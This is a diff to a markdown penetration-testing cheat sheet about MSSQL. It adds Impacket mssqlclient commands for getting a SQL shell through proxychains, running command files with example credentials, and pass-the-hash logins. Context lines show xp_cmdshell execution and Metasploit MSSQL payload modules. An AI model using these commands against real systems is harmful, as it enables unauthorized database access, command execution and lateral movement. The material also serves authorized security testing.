@@ -87,7 +87,7 @@ tds version = 8.0
 ```
 Edit .sqshrc\
 `\set style=vert`\
-Connect to the database:\
+Connect to the database:
 ```bash
 sqsh -S SERVERNAME -U USER -P PASSWORD
 >exec xp_cmdshell 'whoami'
@@ -98,6 +98,19 @@ Metasploit:
 use auxiliary/scanner/mssql/mssql_login
 use exploit/windows/mssql/mssql_payload
 ```
+#### Impacket.
+Get SQL Shell\
+`mssqlclient.exe quabbles/sqladmin@192.168.3.73 -windows-auth`\
+Using proxy\
+`proxychains python mssqlclient.py quabbles/sqladmin@192.168.x.x -windows-auth`\
+Run mssql.txt file when authen success (mssql account)\
+`proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt`\
+Run mssql.txt file when authen success (win authen)\
+`proxychains python mssqlclient.py -p 1433 quabbles/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt`\
+Can using PTH if can\
+`mssqlclient.exe -p 1433 -hashes :"hash" quabbles/sqladmin@192.168.x.x -file command.txt -windows-auth`\
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
+https://github.com/maaaaz/impacket-examples-windows
 ## Oracle-1521
 #### Nmap:
 ```bash
